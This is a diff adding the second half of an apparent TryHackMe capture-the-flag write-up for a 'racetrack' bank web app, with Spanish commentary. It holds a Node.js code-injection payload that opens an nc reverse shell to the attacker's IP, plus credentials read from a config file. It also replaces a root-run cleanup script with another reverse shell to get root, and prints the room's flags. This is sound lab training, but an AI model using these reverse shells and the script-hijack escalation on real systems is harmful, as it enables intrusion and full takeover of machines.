@@ -279,3 +279,285 @@ X-Powered-By: Express
 process.cwd()
 
 The answer is /home/brian/website.
+
+Utilizamos el payload `process.cwd()` para verificar el PATH donde esta la pagina ejecutandose, nos devuelve la carpeta principal de uno de los usuarios, el payload funciona y podemos intentar obtener una shell utilizando `require()`
+
+https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback
+
+require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 4444 >/tmp/f')
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvp 4444                                      
+listening on [any] 4444 ...
+10.10.198.17: inverse host lookup failed: Unknown host
+connect to [10.8.19.103] from (UNKNOWN) [10.10.198.17] 39920
+/bin/sh: 0: can't access tty; job control turned off
+```
+```text
+$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+brian@racetrack:~/website$ id
+id
+uid=1000(brian) gid=1000(brian) groups=1000(brian)
+
+brian@racetrack:~/website$ cd ..
+cd ..
+brian@racetrack:~$ ls
+ls
+admin  cleanup  user.txt  website
+brian@racetrack:~$ cat user.txt
+cat user.txt
+THM{178c31090a7e0f69560730ad21d90e70}
+
+brian@racetrack:~/website/server$ cat middleware.js
+cat middleware.js
+const db = require('./db');
+
+module.exports = {
+    requireAuthMiddleware: async (req, res, next) => {
+        if(req.session.userId !== undefined){
+            req.mustache = (await db.query('SELECT name, gold, premium FROM users WHERE id=$1', [req.session.userId]))[0];
+
+            next();
+        }else {
+            res.status(401).redirect('/login.html');
+        }
+    }
+}
+brian@racetrack:~/website/server$ cat db.js
+cat db.js
+const { Client } = require('pg');
+const path = require('path');
+
+const client = new Client({
+	connectionString: require('./databaseurl.js')
+});
+
+client.connect();
+
+module.exports = {
+    query: async (...args) => {
+        return (await client.query(...args)).rows;
+    }
+}
+
+brian@racetrack:~/website/server$ cat databaseurl.js
+cat databaseurl.js
+module.exports = "postgres://brian:superstrongpass@localhost:5432/racetrackbank";
+
+brian@racetrack:~/website/server$ sudo -s
+sudo -s
+[sudo] password for brian: superstrongpass
+
+Sorry, try again.
+[sudo] password for brian: 
+
+Sorry, try again.
+[sudo] password for brian: 
+
+sudo: 3 incorrect password attempts
+
+brian@racetrack:~$ cd cleanup
+cd cleanup
+brian@racetrack:~/cleanup$ ls
+ls
+cleanupscript.sh
+brian@racetrack:~/cleanup$ cat cleanupscript.sh
+cat cleanupscript.sh
+rm testfile.txt
+brian@racetrack:~/cleanup$ ls -lah
+ls -lah
+total 12K
+drwxr-xr-x  2 brian brian 4.0K Apr 23  2020 .
+drwxr-xr-x 11 brian brian 4.0K Apr 23  2020 ..
+-rwxr--r--  1 root  root    17 Apr 23  2020 cleanupscript.sh
+
+brian@racetrack:~/cleanup$ echo "test" > hi
+echo "test" > hi
+brian@racetrack:~/cleanup$ ls -lah
+ls -lah
+total 16K
+drwxr-xr-x  2 brian brian 4.0K Jul 12 00:20 .
+drwxr-xr-x 11 brian brian 4.0K Apr 23  2020 ..
+-rwxr--r--  1 root  root    17 Apr 23  2020 cleanupscript.sh
+-rw-r--r--  1 brian brian    5 Jul 12 00:20 hi
+
+brian@racetrack:/tmp$ wget http://10.8.19.103:1234/pspy64
+wget http://10.8.19.103:1234/pspy64
+--  http://10.8.19.103:1234/pspy64
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+(1.02 MB/s) - ‘pspy64’ saved [3104768/3104768]
+
+brian@racetrack:/tmp$ chmod +x pspy64
+chmod +x pspy64
+brian@racetrack:/tmp$ ./pspy64
+./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+ CMD: UID=1000  PID=1924   | ./pspy64 
+ CMD: UID=0     PID=1922   | 
+ CMD: UID=0     PID=1857   | 
+ CMD: UID=1000  PID=1795   | /bin/bash 
+ CMD: UID=1000  PID=1793   | python3 -c import pty; pty.spawn('/bin/bash') 
+ CMD: UID=1000  PID=1787   | nc 10.8.19.103 4444 
+ CMD: UID=1000  PID=1786   | /bin/sh -i 
+ CMD: UID=1000  PID=1785   | cat /tmp/f 
+ CMD: UID=1000  PID=1782   | /bin/sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 4444 >/tmp/f 
+ CMD: UID=0     PID=1734   | 
+ CMD: UID=0     PID=1475   | 
+ CMD: UID=111   PID=1168   | postgres: 10/main: brian racetrackbank 127.0.0.1(48356) idle                                                              
+ CMD: UID=1000  PID=1088   | node /home/brian/website/server/index.js                   
+ CMD: UID=1000  PID=1057   | PM2 v4.3.1: God Daemon (/home/brian/.pm2)    
+ CMD: UID=111   PID=952    | postgres: 10/main: bgworker: logical replication launcher                                                                 
+ CMD: UID=111   PID=951    | postgres: 10/main: stats collector process                                                                                
+ CMD: UID=111   PID=950    | postgres: 10/main: autovacuum launcher process                                                                            
+ CMD: UID=111   PID=949    | postgres: 10/main: wal writer process                                                                                     
+ CMD: UID=111   PID=948    | postgres: 10/main: writer process                                                                                         
+ CMD: UID=111   PID=947    | postgres: 10/main: checkpointer process                                                                                   
+ CMD: UID=111   PID=943    | /usr/lib/postgresql/10/bin/postgres -D /var/lib/postgresql/10/main -c config_file=/etc/postgresql/10/main/postgresql.conf 
+ CMD: UID=33    PID=897    | nginx: worker process                            
+ CMD: UID=0     PID=896    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+ CMD: UID=0     PID=895    | /usr/lib/policykit-1/polkitd --no-debug 
+ CMD: UID=0     PID=890    | /usr/sbin/sshd -D 
+ CMD: UID=0     PID=887    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
+ CMD: UID=0     PID=875    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
+ CMD: UID=0     PID=871    | /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
+ CMD: UID=0     PID=861    | /usr/lib/snapd/snapd 
+ CMD: UID=1     PID=853    | /usr/sbin/atd -f 
+ CMD: UID=0     PID=851    | /usr/bin/lxcfs /var/lib/lxcfs/ 
+ CMD: UID=0     PID=850    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
+ CMD: UID=0     PID=844    | /usr/lib/accountsservice/accounts-daemon 
+ CMD: UID=0     PID=837    | /lib/systemd/systemd-logind 
+ CMD: UID=102   PID=833    | /usr/sbin/rsyslogd -n 
+ CMD: UID=103   PID=832    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
+ CMD: UID=0     PID=830    | /usr/sbin/cron -f 
+ CMD: UID=101   PID=748    | /lib/systemd/systemd-resolved 
+ CMD: UID=100   PID=731    | /lib/systemd/systemd-networkd 
+ CMD: UID=62583 PID=559    | /lib/systemd/systemd-timesyncd 
+ CMD: UID=0     PID=512    | 
+ CMD: UID=0     PID=509    | 
+ CMD: UID=0     PID=454    | /lib/systemd/systemd-udevd 
+ CMD: UID=0     PID=446    | /sbin/lvmetad -f 
+ CMD: UID=0     PID=423    | 
+ CMD: UID=0     PID=416    | 
+ CMD: UID=0     PID=407    | 
+ CMD: UID=0     PID=406    | 
+ CMD: UID=0     PID=403    | 
+ CMD: UID=0     PID=402    | 
+ CMD: UID=0     PID=401    | /lib/systemd/systemd-journald 
+ CMD: UID=0     PID=386    | 
+ CMD: UID=0     PID=314    | 
+ CMD: UID=0     PID=313    | 
+ CMD: UID=0     PID=264    | 
+ CMD: UID=0     PID=171    | 
+ CMD: UID=0     PID=166    | 
+ CMD: UID=0     PID=117    | 
+ CMD: UID=0     PID=99     | 
+ CMD: UID=0     PID=90     | 
+ CMD: UID=0     PID=84     | 
+ CMD: UID=0     PID=83     | 
+ CMD: UID=0     PID=82     | 
+ CMD: UID=0     PID=81     | 
+ CMD: UID=0     PID=80     | 
+ CMD: UID=0     PID=79     | 
+ CMD: UID=0     PID=37     | 
+ CMD: UID=0     PID=36     | 
+ CMD: UID=0     PID=35     | 
+ CMD: UID=0     PID=32     | 
+ CMD: UID=0     PID=31     | 
+ CMD: UID=0     PID=30     | 
+ CMD: UID=0     PID=29     | 
+ CMD: UID=0     PID=28     | 
+ CMD: UID=0     PID=27     | 
+ CMD: UID=0     PID=26     | 
+ CMD: UID=0     PID=25     | 
+ CMD: UID=0     PID=24     | 
+ CMD: UID=0     PID=23     | 
+ CMD: UID=0     PID=22     | 
+ CMD: UID=0     PID=21     | 
+ CMD: UID=0     PID=20     | 
+ CMD: UID=0     PID=18     | 
+ CMD: UID=0     PID=17     | 
+ CMD: UID=0     PID=16     | 
+ CMD: UID=0     PID=15     | 
+ CMD: UID=0     PID=14     | 
+ CMD: UID=0     PID=13     | 
+ CMD: UID=0     PID=12     | 
+ CMD: UID=0     PID=11     | 
+ CMD: UID=0     PID=10     | 
+ CMD: UID=0     PID=9      | 
+ CMD: UID=0     PID=8      | 
+ CMD: UID=0     PID=7      | 
+ CMD: UID=0     PID=6      | 
+ CMD: UID=0     PID=4      | 
+ CMD: UID=0     PID=2      | 
+ CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
+ CMD: UID=111   PID=1931   | postgres: 10/main: autovacuum worker process   postgres                                                                   
+ CMD: UID=111   PID=1932   | postgres: 10/main: brian racetrackbank 127.0.0.1(37848) idle                                                              
+ CMD: UID=0     PID=1942   | rm testfile.txt 
+2023/07/12 00:23:01 CMD: UID=0     PID=1941   | /bin/sh ./cleanupscript.sh 
+
+brian@racetrack:~/cleanup$ ls
+ls
+cleanupscript.sh  hi
+brian@racetrack:~/cleanup$ mv cleanupscript.sh cleanupscript.sh.bak
+mv cleanupscript.sh cleanupscript.sh.bak
+brian@racetrack:~/cleanup$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f" > cleanupscript.sh
+ 2>&1|nc 10.8.19.103 1337 >/tmp/f" > cleanupscript.sh 
+brian@racetrack:~/cleanup$ chmod +x cleanupscript.sh
+chmod +x cleanupscript.sh
+brian@racetrack:~/cleanup$ ls -lah
+ls -lah
+total 20K
+drwxr-xr-x  2 brian brian 4.0K Jul 12 00:29 .
+drwxr-xr-x 11 brian brian 4.0K Apr 23  2020 ..
+-rwxr-xr-x  1 brian brian   81 Jul 12 00:29 cleanupscript.sh
+-rwxr--r--  1 root  root    17 Apr 23  2020 cleanupscript.sh.bak
+-rw-r--r--  1 brian brian    5 Jul 12 00:20 hi
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvp 1337
+listening on [any] 1337 ...
+10.10.198.17: inverse host lookup failed: Unknown host
+connect to [10.8.19.103] from (UNKNOWN) [10.10.198.17] 35378
+bash: cannot set terminal process group (2048): Inappropriate ioctl for device
+bash: no job control in this shell
+root@racetrack:/home/brian/cleanup# cd /root
+cd /root
+root@racetrack:~# ls
+ls
+root.txt
+root@racetrack:~# cat root.txt
+cat root.txt
+THM{55a9d6099933f6c456ccb2711b8766e3}
+```
+![[Pasted image 20230711190111.png]]
+User flag
+What does the name of the bank hint at?
+Root flag
+Experiment and be creative.
+
+## Flags / Answers
+- ***THM{178c31090a7e0f69560730ad21d90e70}***
+- ***THM{55a9d6099933f6c456ccb2711b8766e3}***
+
+## Notes / Lessons Learned
+[[Carpe Diem 1]]
+
